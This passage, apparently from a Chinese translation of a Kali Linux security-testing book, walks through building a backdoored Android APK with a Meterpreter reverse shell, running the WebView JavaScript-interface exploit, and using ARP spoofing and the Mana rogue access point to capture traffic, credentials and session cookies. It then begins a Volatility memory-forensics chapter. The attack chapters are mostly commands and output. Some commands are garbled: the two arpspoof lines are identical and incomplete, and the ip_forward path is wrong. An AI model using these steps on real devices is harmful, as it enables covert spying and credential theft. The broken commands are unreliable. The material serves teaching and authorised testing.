  我用于演示的 Android 设备没有系统密码或 PIN。但如果有，通过访问 `/Data/System` 目录，你可以获得 PIN 甚至删除存在的手势密钥文件。更多信息请参见\
  \ Infosec Institute 上这篇非常有价值的文章：\n\nhttp://resources.infosecinstitute.com/android-forensics/\n\
  \n### 结论\n\n\n\n\n希望在本节中，我们已经了解了对智能设备进行 root 的危险性。如果攻击者能够获得对已根设备的远程访问，他将能够访问通常受保护的系统文件。他可以通过查看这些文件来获取密码和其他重要信息。\n\
  \n## 资源\n- http://www.sqlite.org/cli.html\n\n# 第 28 章\n\n## Android 设备安全测试\n\n在本节中，我们将讨论\
  \ Android 设备的安全性测试。我们将使用一台 Android 设备和我们的 Kali Linux 系统。首先，我们将看到如何使用 `Msfvenom`\
  \ 创建一个带有后门的 Android 应用程序，然后查看 Kali 内置的针对 Android 的网站漏洞利用工具。在本节的大部分内容，你可以交替使用手机或平板电脑，在大多数情况下它们真的没有区别。如果你没有设备，可以使用我们之前创建的模拟\
  \ AVD 设备。尽管看起来自从从本书的初稿以来，所有的 AVD 设备都已针对我们将使用的这种基于网站的漏洞修复了补丁。\n\n首先，让我们来看看如何使用 `Msfvenom`\
  \ 创建一个包含远程 shell 的 Android 应用程序。这在安全测试期间是非常好的尝试方法，可以看看你是否可以通过社会工程学让目标实际运行并安装该应用。\n\
  \n### 使用 Metasploit 获取 Android 远程 shell\n\n本教程将包括使用 `Msfvenom` 创建带有后门的 Android 应用，然后在\
  \ Metasploit 中创建一个监听服务以监听后门的回连（callback）。一旦完成回连，监听器就会为设备创建一个功能完全的远程 shell。\n\n在此之前，有一些免责声明——尽管这种技术可以让你获得\
  \ Android 设备的完整远程会话，但请意识到 Metasploit 是一个安全测试平台，而不是唯一的黑客平台。因此，在使其工作之前，你需要采取一些步骤。\n\
  \n1. 在手机上启用“允许未知来源的应用程序”。我们显然不会尝试将带有陷阱的 `.apk` 文件放入 Google 商店。因此，我们必须通过下载或附件安装创建的应用文件。因此，你必须在手机的安全设置中启用“允许未知来源的应用程序”。\n\
  2. 将手机的睡眠设置设置为 5 分钟或以上——当手机进入睡眠状态时，它会断开网络连接，从而杀死 `Meterpreter` 会话。\n3. Android 设备会多次警告正在安装\
  \ shell。在安装应用之前必须接受这些警告。\n4. 最后，不要用你日常使用的手机做这个！我强烈建议使用用于测试的备用手机或平板电脑，甚至使用用 Android\
  \ SDK 创建的模拟设备。\n\n### 创建带有陷阱的 APK 文件\n\n首先，我们需要创建一个包含远程 shell 的 APK。为此，我们将使用 Metasploit\
  \ 中的 `msfvenom` 命令。\n\n1. 在 Kali Linux 中，打开终端提示并输入：\n\n```\nmsfvenom -p android/meterpreter/reverse_tcp\
  \ LHOST=192.168.1.39 LPORT=4444 -o evilapp.apk\n```\n![](img/image01033.jpeg)\n\n\
  `msfvenom` 命令采用 `meterpreter` 负载之一，并允许你创建一个创建一个独立的文件。你需要在 `LHOST` 地址处填入你的 Kali Linux\
  \ IP 地址。如果你愿意，也可以更改端口地址。\n\n运行后，将创建一个名为 `evilapp.apk` 的文件。\n\n2. 现在将此文件发送到你的 Android\
  \ 设备，在此例中我使用了智能手机。有很多方法可以做到，你可以通过电子邮件发送，或者通过 USB 连接并复制。但对于这个示例，我简单地将 `.apk` 文件放在\
  \ Kali 2 `/var/www/html` 文件夹中，启动 apache 服务器并通过手机浏览器下载了它。\n![](img/image01034.jpeg)\n\
  \n3. 当文件在 Android 上安装时，它会像所有应用一样出现，并向你显示它想要访问手机的权限。我想它列出了几乎可能性，基本上是想要对手机的完全访问权限。这应该是用户的一个警告，这不是他们应该运行的应用！\n\
  ![](img/image01035.jpeg)\n\n现在“恶意的”应用已经安装，我们需要设置 Metasploit 来监听待入的连接。\n\n4. 在 Kali\
  \ 中，启动 Metasploit (`msfconsole`)\n\n5. 一旦 Metasploit 启动，输入以下内容创建监听器：\n\n- `use exploit/multi/handler`\n\
  - `set payload android/meterpreter/reverse_tcp`\n- `set lhost 192.168.1.39`\n- `set\
  \ lport 4444`\n\n然后输入 `exploit` 启动处理程序：\n![](img/image01036.jpeg)\n\n6. 在你的 Android\
  \ 设备上运行该应用。我的应用在应用列表中显示为安卓机器人，名称为“Main Activity”。\n\n7. 当你运行应用时，似乎什么都没有发生，但一旦点击，你的手机就会连接到\
  \ Metasploit 系统，并创建一个远程 shell 会话。\n\n在你的 Metasploit 系统上，你应该看到这个：\n创建了一个活动会话，并会自动将你带入\
  \ `meterpreter` 提示符。\n\n8. 从这里你可以输入 `sysinfo` 来获取设备信息：\n![](img/image01038.jpeg)\n\
  \n9. 你可以通过输入 `ps` 查看正在运行的进程：\n![](img/image01039.jpeg)\n\n如果我们需要，还可以运行 shell 命令直接带我们进入直接的终端\
  \ shell：\n![](img/image01040.jpeg)\n\n你可以使用标准的 Linux 命令如 `ls`、`pwd` 和 `cd` 远程浏览\
  \ Android 设备。此例中的 Android 手机没有被 root，所以我无法访问受保护的 `/data/data` 目录：\n![](img/image01041.jpeg)\n\
  \n你可以输入 `exit` 回到 `meterpreter` 提示符。从这里输入 `help` 将列出所有可用命令：\n![](img/image01042.jpeg)\n\
  \n注意命令的最后一页，摄像头和 Android 命令。让我们试试这些吧！\n\n### 摄像头命令\n\n输入 `webcam_list`，你将看到设备摄像头选项。我有一个前摄像头和一个后摄像头，所以它列出了两者：\n\
  1: 后摄像头\n2: 前摄像头\n\n输入 `webcam_snap -h` 查看摄像头快照选项：\n\n```\nUsage: webcam_snap [options]\n\
  \n从指定的摄像头抓取一帧。\n\nOPTIONS:\n  -h      帮助横幅\n  -i index  要使用的摄像头索引 (默认: 1)\n  -p\
  \ path   JPEG 图像路径 (默认: 'lsb.jpeg')\n  -q quality  JPEG 质量 (默认: '50')\n  -v    \
  \  自动查看 JPEG 图像 (默认: 'true')\n```\n\n所以如果我们想从前置摄像头拍照：\n`webcam_snap -i 2`\n\n手机会拍照，然后在\
  \ Kali 中显示。这是我我手机上弹出的内容：\n![](img/image01043.jpeg)\n\n我们新的小猫在睡觉！所以基本上如果目标安装了带有陷阱的\
  \ apk，我们就可以获得对他们摄像头的完全访问。在安全环境中，这可能是一个大问题。\n\n### Android Meterpreter 命令\n\nMeterpreter\
  \ 中有几个 Android 命令：\n\n- `check_root` - 检查设备是否已 root\n- `dump_calllog` - 获取通话记录\n\
  - `dump_contacts` - 获取联系人列表\n- `dump_sms` - 获取短信\n- `geolocate` - 使用地理定位获取当前经纬度\n\
  \n第一个命令返回设备是否已 root：\n![](img/image01044.jpeg)\n\n让我们运行其余命令看看它们能做什么：\n![](img/image01045.jpeg)\n\
  \n\n\n日期：2015-08-10 10:15:42\n地址：(717) 305-1120\n状态：未接收（NOT_RECEIVED）\n消息：我们在纽约市！\n\
  \n# #2\n类型：传入\n日期：2015-08-10 24:10:32\n地址：7172221919\n状态：未接收（NOT_RECEIVED）\n消息：太好了，拍些照片！\n\
  \n# #3\n类型：发出\n日期：2015-08-10 25:22:34\n地址：(717) 305-1120\n状态：未接收（NOT_RECEIVED）\n\
  消息：去他的，我找到食物！！！\n\n## 下载数据\n\n我们还可以使用 Meterpreter 的 `upload` 和 `download` 命令在 Kali\
  \ 和智能设备之间传输数据。让我们从 Android 下载一张图片。\n\n在 Meterpreter 中，我进入了 `/mnt/sdcard/Picture`\
  \ 目录（有时它们位于 `DCIM` 目录），并寻找一些有趣的东西：\n\n![](img/image01046.jpeg)\n\n有一张名为 `AlienSpider.jpg`\
  \ 的图片，我们必须看看是什么。使用 `download` 命令将图片从设备下载并保存到我们的桌面：\n\n![](img/image01047.jpeg)\n\
  \n一旦保存到本地，我们只需打开它即可：\n\n![](img/image01048.jpeg)\n\n一只在阿迪朗达克山脉晒太阳的巨大外星蜘蛛！\n\n就是这样，用户安装了一个错误的应用程序，攻击者就可以远程访问你的手机或其他\
  \ Android 设备。顺便说一下，我第一次运行这个程序时，手机上运行着一个流行的 Android 杀病毒程序，它在允许我的远程 shell 时并没有出现问题。\n\
  \n在本教程中，我们看到了如何创建一个陷阱程序，并在用户安装并执行它时获取远程手机的访问。最大的安全措施是永远不要从未知来源安装应用程序。此外，特别注意程序在安装新应用时请求的权限和功能。如果一个游戏想要\
  \ get 手机的完全访问权限，包括拨打电话和访问短信的能力，这应该是一个红旗。在下一节中，我们将查看一种用于 Android 手机的常见网络漏洞。\n\n###\
  \ Android Webview 漏洞教程\n\n大约一年前，Android 领域的一个大新闻是发现了一个 JavaScript 漏洞，大量的 Android\
  \ 设备容易受到该漏洞的影响。据报道，市中约 70% 的 Android 设备都可能受到此漏洞的影响，它允许攻击者只需通过访问恶意页面或扫描恶意二维码，即可远程访问你的手机。该漏洞被称为“Android\
  \ WebView addJavascriptInterface 漏洞”，当某些 Android 设备上的受漏洞的 `WebView` 执行了不受信任的 JavaScript\
  \ 代码时，该漏洞就会生效。\n\n在漏洞被泄露后不久，Metasploit 增加了一个漏洞模块。在本教程中，我们将使用 Kali Linux 和我们的目标 Android\
  \ 设备查看它。\n\n![](img/image01049.jpeg)\n\n1. 在终端提示符处输入 `msfconsole`。\n2. 输入 `use exploit/android/browser/webview_addjavascriptinterface`。\n\
  3. 然后输入 `show options` 查看需要设置的选项：\n\n![](img/image01050.jpeg)\n\n现在输入你的 `LHOST`\
  \ 和 `LPORT` 设置，我们还需要设置 `URIPATH` 变量。默认情况下它是随机的，所以我把它改成了更容易输入的字符——“security”（听起来很安心）。\n\
  \n- 输入 `set LHOST 192.168.1.39`\n- 输入 `set LPORT 4444`\n- 然后， `set URIPATH security`\n\
  - 最后，输入 `exploit`：\n\n![](img/image01051.jpeg)\n\nKali 系统上启动了一个服务器，托管了一个包含该漏洞的网页。提供了一个包含\
  \ URI 路径的 URL。现在，如果受漏洞的 Android 设备访问我们位于 `192.168.1.39:8080/security` 的 Metasploit\
  \ 模块，我们就获得了一个远程会话：\n\n![](img/image01052.jpeg)\n\n现在使用 `sessions -i 1` 连接会话：\n\n\
  ![](img/image01053.jpeg)\n\n就是这样！我们已经连接上了，如你看到的，我拥有了 Android 设备的完整远程 shell。我只需要使用内置的浏览器访问恶意页面，漏洞就会运行，无需\
  \ Android 设备的任何进一步警告或输入。更糟糕的是，URL 可以被打印成二维码，这样一旦被扫描，它会自动进入恶意页面，实现真正的“点击即攻破”。\n\n\
  ### 结论\n\n那么你可以做什么来保护自己免受此类攻击？对于 `Msfvenom` 后门程序，最好的建议是永远不要从第三方位置安装未签名的第三方应用。仔细观察请求的权限，如果应用请求的权限超过所需的，请不要安装该应用。\n\
  \n对于“Webview 漏洞”，该漏洞仅适用于版本 `< 4.2` 的 Android。虽然现在许多 Android 设备已经修复了此漏洞，但可能仍有大量的\
  \ Android 设备受到这种攻击。在测试期间，我尝试了五台 Android 设备，只有一个存在漏洞。\n\n某些 Android 设备的一个固有问题似乎是获取更新的补丁。由于过程中涉及多个制造商和提供商，有时补丁并不会立即可用。而且某些设备在货架上放置了很长时间，某些设备在购买时就需要更新。\n\
  \n## 第 29 章\n\n## 针对 Android 的中间人攻击与 Wi-Fi 攻击\n\n由于大多数 Android 设备都有连接 Wi-Fi 网络的能力，它们容易受到无线中间人（MitM）攻击。它们还可能受到多种无线协议攻击，如恶意路由器和拒绝服务攻击。由于我在第一本书《使用\
  \ Kali Linux 进行基础安全测试》中涵盖了这些类型的攻击，我将不会详细介绍，只需简要展示这些攻击将如何针对连接 Wi-Fi 的智能手机和平板的。在本节中，我们将仅通过\
  \ Wi-Fi 接口对 Android 设备进行安全测试，而不是 GSM/CDMA/LTE。\n\n### 引言\n\n当攻击者将系统插入到用户和网络之间时，就会发生“中间人”攻击或\
  \ MitM。这通常通过执行 ARP 协议攻击来实现。本质上，攻击者使用工具欺骗电脑认为自己是路由器，并欺骗路由器认为自己是用户的电脑。通过这种方式，攻击者可以查看用户与互联网之间传输的数据。\n\
  \n![](img/image1054.jpeg)\n\n上面的图片表示了智能设备通过 Wi-Fi 连接到互联网时的正常工作方式。用户设备与路由器通信，路由器再与互联网通信。\n\
  \n![](img/image01055.jpeg)\n\n第二张图片表示中间人攻击。“恶意黑客”将自己插入到路由器和用户的通信流中。从用户发往互联网的所有流量经过黑客，从互联网返回的所有流量在发送给用户之前也经过黑客。通过这种方式，黑客可以查看所有入站和出站流量。\n\
  \n在信号差区域或者使用 Wi-Fi 比手机网络更有优势时，用户会开启 Wi-Fi 并连接到本地无线路由器。这时，Android 设备就像任何连接到路由器的电脑一样，可以被黑客利用无线攻击攻击。Android\
  \ 设备还受到社交工程类攻击的影响，包括恶意路由器和网站伪造。\n\n### 使用 ARPspoof 进行中间人攻击\n\n你可以在“设置”部分查看手机的本地\
  \ IP 地址，在我的手机上位于“关于手机”和“状态”下。你也可以在无线网络设置中找到它。这在安全测试期间通常不逻辑，因为你可能无法获得设备的物理访问。因此在这种情况下，`nmap`\
  \ 是我们的朋友。\n\n\n\n\n在 Kali Terminal 中运行 `nmap -sn 192.168.1.0/24`：\n\nStarting `nmap`\
  \ for `https://nmap.org` at 2015-08-30 14:14\n\nNmap scan report for link 192.168.1.1\
  \ is up (9ms latency).\n\nNmap scan report for android is up (54ms latency).\nMAC\
  \ Address: `00:41:92:3C:F2:78`\nNmap done: 1 hosts scanned in 0.64 seconds\n\n在本次扫描中，我们搜索了整个\
  \ Wi-Fi 网络并发现了一个位于 `192.168.1.1` 的 Android 设备。一旦我们获得了设备的 IP 地址（在本例中为一台平板电脑），我们就可以设置中间人攻击（MitM\
  \ attack）。\n\n1. 在终端提示符处输入 `echo 1 > /proc/sys/ipv4/ip_forward`\n2. 接着输入 `arpspoof\
  \ -i eth0 -t 192.168.1.1`\n   `-i eth0` 是你的以太网接口。`-t` 是目标。请确保将 IP 地址替换为你的 Android\
  \ 手机地址和路由器地址。\n3. 打开第二个终端并输入 `arpspoof -i eth0 -t 192.168.1.1`\n   基本上相同的命令，但手机和路由器的顺序反了。这些命令将你的\
  \ Kali 系统置于从路由器到目标的所有流量以及从你的手机到互联网的所有出通信之间。\n\n在两个终端窗口中，你都将看到不断的 ARP 响应：\n(MAC Addresses)\
  \ arp reply `192.168.1.1` is at (attacker MAC)\n(MAC Addresses) arp reply `192.168.1.1`\
  \ is at (attacker MAC)\n\n4. 现在既然我们已经设置好，打开第三个终端窗口并输入 `urlsnarf -i eth0`\n   `-i\
  \ eth0` 选项告诉 `urlsnarf` 监控哪个接口，在这种情况下是主接口 (`eth0`)。一旦输入此命令，你就可以看到目标手机访问的网站，如下所示：\n\
  \n```\nurlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]\nandroid-\
  \ - [30/Aug/2015:14:31:44 -0400] \"GET http://www.google.com/webhp?client=tablet-unknown&source=android-home\
  \ HTTP/1.1\" - - \"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build) Version/4.0\
  \ Mobile Safari/503.3\"\n```\n\n一旦 Android 设备访问网站，它就会显示在我们的 Kali 系统上。基本上就是这样，在完全不接触用户手机/平板电脑的情况下，我们能够准确看到目标在互联网上做什么。\n\
  \n### TCP Dump 和 Wireshark\n\n这很有趣，但我们也可以使用数据包捕程序程序流量并在稍后分析。例如，让我们用 `tcpdump` 捕捉\
  \ Android 手机的流量并在 Wireshark 中查看。\n\n1. 按 `Ctrl+C` 停止 `urlsnarf`。\n2. 要查看 `tcpdump`\
  \ 选项，输入 `tcpdump -h`\n3. 要启动捕捉，运行 `tcpdump -i eth0 -w android.pcap`\n   `-i` 选项再次列出了我们网络接口\
  \ `eth0`。`-w android.pcap` 选项指定了要创建的输出文件的名称。\n4. 在手机的浏览器浏览器上上网。\n5. 按 `Ctrl+C` 结束数据包捕捉。\n\
  \n![](img/image01056.jpeg)\n\n我们现在有了智能设备生成的网络流量的完整副本并保存为文件。现在只需在 Wireshark 中打开 `android.pcap`\
  \ 文件：\n\n6. 在 Wireshark 中打开 `android.pcap` 文件。\n7. 点击 `File` -> `Export Objects`\
  \ -> `HTTP`。\n8. 在 Wireshark 中，你可以在过滤器栏输入 `http` 来过滤流量。\n9. 右键点击数据包并选择 `Follow`\
  \ -> `TCP Stream`。\n10. 这允许你看到通信的全内容。\n11. 你还可以将捕到的文件保存到你的机器上。\n\n12. 要停止捕捉，在终端中按\
  \ `Ctrl+C`。\n13. 文件将保存在运行命令的目录中。\n14. 你现在可以使用任何数据包分析器分析流量了。\n\n\n\n\n\n## 运行 Mana\n\
  \n### 5. 切换到 `/usr/share/mana-toolkit/run-mana`\n\n### 6. 输入 `./start-nat-full.sh`\
  \ 启动 Mana\n\nMana 将会启动恶意无线路由器、`SSLstrip` 以及所有其他所需的工具并开始监听流量：\n\n```\nroot@kali:/usr/share/mana-toolkit/run-mana#\
  \ ./start-nat-full.sh\n\nhostname WRT54G\n\nCurrent MAC:   23:23:04:45:67:2d (Bogus\
  \ Wi-Fi Mac)\nPermanent MAC: 23:23:04:45:67:2d (Bogus Wi-Fi Mac)\nNew MAC:     \
  \  d4:76:b2:6f:21:87 (unknown)\nConfiguration file: /etc/mana-toolkit/hostapd-karma.conf\n\
  Using interface wlan0 with hwaddr 00:11:00:33:11:00 and ssid \"Internet\"\nwlan0:\
  \ interface state UNINITIALIZED->ENABLED\nwlan0: AP-ENABLED\nInternet Systems Consortium\
  \ DHCP Server 4.3.1\nCopyright 2004-2014 Internet Systems Consortium.\nAll rights\
  \ reserved.\nFor info, please visit https://www.isc.org/software/dhcp/\nConfig file:\
  \ /etc/mana-toolkit/dhcpd.conf\nDatabase file: /var/lib/dhcp/dhcpd.leases\nPID file:\
  \ /var/run/dhcpd.pid\nWrote 0 leases to leases file.\nListening on LPF/wlan0/00:11:22:33:44:00/10.0.0.0/24\n\
  Sending on   LPF/wlan0/00:11:22:33:44:00/10.0.0.0/24\nSending on   Socket/fallback/fallback-net\n\
  /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2\nGenerated RSA key for leaf certs.\n\
  ```\n\n观察 Mana 的运行过程非常有趣的。一旦有人连接，当目标浏览网页时，Mana 将显示并存储检测到的任何凭据和 Cookie。你还可以看到 Mana\
  \ 动态创建安全证书以绕过安全通信。\n\n### 7. 完成后，按“Enter”键停止 Mana。如果它在一段时间后没有响应，你可能需要按下 `cntrl-c`。\n\
  \n### 8. 要检查捕获了哪些活跃登录会话，运行 `firelamb-view.sh` 查看捕获的认证 Cookie：\n\n![Mana firelamb](https://cyberarms.files.wordpress.com/2014/10/mana-firelamb.png)\n\
  \n这会询问你想从捕获的 Cookie 会话中尝试哪一个。然后它会尝试在 `Firefox` 中打开该会话。如果用户仍处于状态，你就可以接管他们的会话。因此，如果他们登录了电子邮件账户，你可能镜像他们的登录并访问其在线邮箱账户。\n\
  \n你也可以手动在 `/var/lib/mana-toolkit` 中检查查看日志文件。通过查看日志文件，我能够看到来自我 Android 设备的明文账户登录记录：\n\
  \n```\n2015-08-30 20:27:26,200 SECURE POST Data (login: --REDACTED--.com):\nloginfmt=cyberarms%40&login=cyberarms&passwd=password\n\
  ```\n\n第一行显示用户登录了哪个网站，第二行显示他们的用户名和密码。这通常是通过加密的 HTTPS 完成的，无法查看。但 Mana 以明文形式显示了它。\n\
  \n## 强制性门户 (Captive Portal)\n\n如前所述，Mana 还配备了“强制性门户”（Captive Portal）模拟器。如果你曾经在快餐店、酒店或“网吧”使用过\
  \ Wi-Fi，那么你就见过强制性门户。强制性门户是与公共用户共享互联网的一种安全方式。\n\n如果你在浏览器中访问 Kali 的主 IP 地址，你会发现默认网页已被更改。它现在模拟了一个强制门户\
  \ Wi-Fi 登录页面：\n\n![](img/image01064.jpeg)\n\n强制性门户通过要求用户使用以下流行选项登录来“允许”目标系统访问互联网：\n\
  \n- Google\n- Facebook\n- Twitter\n- Microsoft\n- Local（本地）\n\n一旦他们使用凭据“登录”，Mana\
  \ 允许他们连接到互联网。\n\n### 结论\n\n在本节中，我们学习了当智能设备在 Wi-Fi 模式下运行时，它们容易受到许多相同的协议和窃听技术。我只是简单地提了这个话题，但正如你所见，如果目标正在使用\
  \ Wi-Fi，我们可以使用标准的中间人（MitM）技术攻击设备，拦截并查看他们的数据。使用像 Mana 和 `SSLstrip` 这样的程序，你还将能够查看加密数据。\n\
  \n防御此类攻击的最佳方法是确保你的无线路由器使用长且复杂的 WPA2-PSK (AES) 无线密钥妥善保护，或者使用企业级加密解决方案。确保你的路由器固件是最新的，并使用长且复杂的路由器管理员密码。不要与任何人共享无线密钥，不要在公共场所发布你的密钥。你会惊讶于我见过多少次无线密码发布在办公室里任何人都能看到的地方。分段并监控你的网络。最后，永远不要信任开放的公共\
  \ Wi-Fi 进行业务交易、在线购物或银行付款。请记住，隐藏路由器 SSID 或使用 MAC 过滤无法阻止有经验的攻击者。\n\n## 资源\n\n- TCPdump\
  \ 网站：[http://www.tcpdump.org/]\n- TCPdump 手册：[http://www.tcpdump.org/manpages/tcpdump.1.html]\n\
  - Wireshark 网站：[https://www.wireshark.org/]\n- Wireshark Wiki：[http://wiki.wireshark.org/]\n\
  - Sensepost Mana：[https://github.com/sensepost/mana]\n\n# 取证学\n\n## 第 30 章\n\n##\
  \ 取证引言\n\n在本节中，我们将从计算机安全测试人员的角度来看取证学。在此过程中，我们不会涵盖获取和处理证据的法律性问题，也不会讨论监管链（chain of\
  \ custody）或恰当的文档记录。我们仅仅涵盖 Kali 中可用的几种工具，以执行不同类型的取证，尝试恢复在安全测试场景中可能有用的信息，而不是法庭案件。\n\
  \n因此，我们不关注安装和使用软件或硬件写写保护器的正常取证流程，也不关注为法庭案件准备和保护恢复的信息。如果你计划将 Kali 及其包含的工具用于法律取证案件，那么由你来检查联邦、州和当地法律关于证据收集的规定。\n\
  \n### 取证工具\n\n我们将深入介绍如何使用几种最流行的取证工具，其他工具我们将仅显示命令以及如何执行。虽然在本书的范围之外，但有一些有趣的 PowerShell\
  \ 取证选项未包含在 Kali 中。Invoke-ir.com 的 `PowerForensics` 就是这样一个选项：\n\nhttps://github.com/Invoke-IR/PowerForensics\n\
  \n### 使用 Volatility 分析内存\n\n免责声明：这里介绍的取证章节绝非用于真实的法律程序或获取和保护实际事件的证据。这里介绍的技术并不符合取证规范。\n\
  \n分析系统内存制品是取证分析师、安全专家和恶意软件分析师使用的技术。在本章中，我们将查看 Kali 中包含的一个经典的内存分析工具——`Volatility`。虽然这不是对\
  \ `Volatility` 的彻底探讨，但我们将看到如何从内存转储中提取相关信息，并使用该工具进行非常基础的分析。\n\n你将学习如何快速获取活动内存 dump，以及恢复以下信息：\n\
  \n- 注册表信息\n- 活跃进程列表\n- 网络连接\n\n我们还将快速查看一个受恶意软件感染的系统。\n\n### 获取内存转储\n\n有多个程序可以获取内存转储。你也可以从多个来源进行内存分析。\n\
  \n这里是几种：\n\n- 直接从活动内存\n- 虚拟内存文件\n- 休眠文件\n- 崩溃转储\n- 远程系统\n\n在本教程中，我们将介绍直接从活动内存中恢复信息，随后从虚拟内存文件中恢复信息。\n\
  \n\n\n\n\n在本节中，我们将使用长期备的工具之一 MoonSols “DumpIt” 来获取我们的 Windows 7 测试虚拟机的内存。`DumpIt`\
  \ 是一个使用非常方便的程序，只需运行它即可创建物理内存的副本并将其保存到当前目录。你可能想在 Windows 7 虚拟机中随便转转；例如登录托管在上面的 Mutillidae\
  \ 等，这样就会有很多有待恢复的痕迹。\n\n## 1. 提取内存\n\n1. 只需下载 `DumpIt` 程序：[`www.moonsols.com/2011/07/18/moonsols-dumpit-goes-mainstream/`](http://www.moonsols.com/2011/07/18/moonsols-dumpit-goes-mainstream/)\n\
  2. 将其放入 USB 驱动器或保存到目标系统的硬盘上。\n3. 双击它，连续两次选择 yes，在你反应过来之前，你机器的完整内存就已经存储在磁盘上了！\n\n\
  ![](img/image01065.jpeg)\n\n你唯一需要确保的一点（尤其是使用 USB 驱动器时）是它的空间足够大，能够容创建的文件。内存转储的大小与你安装的\
  \ RAM 大小相似或略大。去下载 `DumpIt` 并获取你的 Windows 7 虚拟机的内存转储吧。休息一下，这可能需要一段时间，特别是目标系统有很多 RAM\
  \ 的时候。\n\n![](img/image01066.jpeg)\n\n一旦保存了内存转储，现在可以使用 `Volatility` 对其进行分析。\n\n\
  ![](img/image01067.jpeg)\n![](img/image01068.jpeg)\n\n将生成的内存文件复制到我们的 Kali 系统，放在桌面名为“analysis”的文件夹中。\n\
  \n## 2. 使用 Volatility 分析内存镜像\n\n现在我们已经将内存 `.raw` 文件传输到了 Kali，让我们开始分析它。你可以从 Forensics（取证）菜单启动\
  \ `Volatility`，但从终端启动它也同样简单。\n\n- 要查看 volatility 的选项，输入 `volatility -h`：\n\n![](img/image01069.jpeg)\n\
  \n要开始分析，我们需要获取镜像信息。如果你有一个很大的转储文件，运行此命令可能需要一段时间。输入以下命令：\n\n```\nvolatility imageinfo\
  \ -f [memorydumpfilename.raw]\n```\n\n![](img/image01070.jpeg)\n\n`Imageinfo` 命令为你提供了几项信息。`-f\
  \ memorydumpfilename.raw` 通知命令使用我们刚刚创建的内存捕获文件。目前，我们只需要知道内存转储的配置类型（profile），在此情况下为\
  \ `Win7SP1x86`。我们将在接几个步骤中使用它。\n\n### 分析注册表键\n\n`Volatility` 在处理注册表时包含了多个命令：\n\n\
  - `Hivelist`\n- `Hivedump`\n- `Printkey`\n- `Userassist`\n\n首先，我们需要配置表单元列表（hive\
  \ list），以便获取注册表信息所在的起始位置。\n\n### Hivelist\n\n- 输入 `volatility hivelist -f [memorydumpfilename.raw]\
  \ --profile=Win7SP1x86`\n\n`Hivelist` 告诉 volatility 显示注册表配置单元（hive）。而 `--profile=Win7SP1x86`\
  \ 告诉 Volatility 在查看内存转储时使用 Windows 7 SP1 x86 格式。每个内存转储将数据存储在不同的位置，因此你需要选择正确的配置类型以匹配目标系统。\n\
  \n![](img/image01071.jpeg)\n\n我们现在得到了内存转储中几个关键项目位置的列表。我们可以利用这些信息来寻找单个痕迹，或者直接转储整个配置单元列表。\n\
  \n### Hivedump\n\n要做到这一点，你只需要使用 `hivedump` 命令，并从上方恢复的列表中选择你想查看的配置单元的虚拟内存地址。我们将查看\
  \ Software 配置单元，因此我们将使用 `0x8d31d650` 的虚拟偏移地址（第一列的十六进制数）：\n\n![](img/image01072.jpeg)\n\
  \n```\nvolatility -f [memorydumpfilename.raw] --profile=Win7SP1x86 hivedump -o 0x8d31d650\n\
  ```\n为你的内存转储文件填写正确的值以及 `SOFTWARE` 注册表键的虚拟十六进制值。\n\n这将从注册表中转储 Software 配置单元并像下面的信息一样打印：\n\
  \n…\\7-Zip\n…\\ATI Technologies\n…\\ATI Technologies\\Install\n…\\ATI Technologies\\\
  Install\\South Bridge\n\n从这段返回的小片段中，我们看到用户安装了 7 Zip，并且正在使用 ATI Technologies 的显卡软件。使用\
  \ `hivedump` 会返回大量的注册表设置，这比我们需要的要得多。但你也可以通过 `printkey -K \"[Registry Key Location]\"\
  ` 切换搜索特定数据的注册表键来访问单个键的信息。\n\n### Printkey\n\n如果我们想从内存转储中恢复用户名，可以访问 SAM Names 键：\n\
  \n```\nvolatility --profile Win7SP1x86 -f [memorydumpfilename.raw] printkey -K \"\
  SAM\\Domains\\Account\\Users\\Names\"\n```\n\n这返回了系统用户名：\n\n![](img/image01073.jpeg)\n\
  \n我们还可以通过检查 `Winon` 注册表键找到最后登录用户的名字：\n\n```\nvolatility --profile Win7SP1x86 -f\
  \ [memorydumpfilename.raw] printkey -K \"Software\\Windows NT\\CurrentVersion\\\
  Winon\"\n```\n\n这返回了一些位置的信息，但当我们查看列表底部时可以看到：\n\n![](img/image01074.jpeg)\n\n###\
  \ UserAssist\n\nUserAssist 是一个记录了用户运行了什么、运行了多少次以及运行时间的有趣键：\n\n```\nvolatility --profile\
  \ Win7SP1x86 -f [memorydumpfilename.raw] userassist\n```\n\n这也返回了大量信息，当你查看它时，可以发现用户的活动报告：\n\
  \n![](img/image01075.jpeg)\n\n此示例显示他们运行了 Wordpad，随后从 E: 盘运行了两次 `DumpIt.exe`。\n\n\
  在我们看到如何恢复注册表信息后，让我们看看如何从内存文件中恢复运行进程列表和活动连接。这些步骤通常是进行镜像分析时的首选。\n\n### 进程列表\n\n使用\
  \ Volatility 的 `pslist` 命令可以查看正在运行的进程：\n\n```\nvolatility pslist -f [memorydumpfilename.raw]\
  \ --profile=Win7SP1x86\n```\n\n从命令输出中，可以看到物理位置、进程名称以及所有进程的 PID 号。你也可以使用 volatility\
  \ 查看运行的具体程序。这有助于恶意软件分析师追踪恶意进程及其关联程序。我们稍后讨论。\n\n![](img/image01076.jpeg)\n\n### DOS\
  \ 命令历史\n\n另一个我们可以运行的有趣命令是 `cmdscan`。此插件允许我们看到从命令行提示符运行了哪些命令。\n\n```\nvolatility\
  \ cmdscan -f [memorydumpfilename.raw] --profile=Win7SP1x86\n```\n\n![](img/image01077.jpeg)\n\
  \n在这种情况下它没什么帮助，但在某些情况下，我看到它列出了在命令行会话期间输入的逐行命令。但它确实捕捉到了我曾在命令行使用 PowerShell 和 DumpIt。如果你怀疑用户使用了\
  \ DOS 命令，这些信息对分析机器非常有益。\n\n### 使用 Netscan（以及 Connscan）查看网络连接\n\n通过 `netscan` 命令查看内存转储中活跃的网络连接（`connscan`\
  \ 是该命令的 Windows XP 版本，基本相同）。\n\n```\nvolatility netscan -f [memorydumpfilename.raw]\
  \ --profile=Win7SP1x86\n```\n\n![](img/image01078.jpeg)\n\n返回的数据显示了所有网络连接，包括进程名称、源目的\
  \ IP 地址——包括端口。这只是实际返回内容的一个短片段，实际列表至少有三倍长，因为在拍摄快照时用户打开了几个网页。\n\n这些信息有助于分析师查看哪些网络连接是活跃的。但也可以帮助安全测试人员获取有关目标网络的价值信息。\n\
  \n浏览器历史与缓存\n\n\n\n\n取证调查人员和安全分析师可以用户的浏览历史中发现感兴趣的信息。Volatility 的 `iehistory` 命令可以从内存中提取并显示\
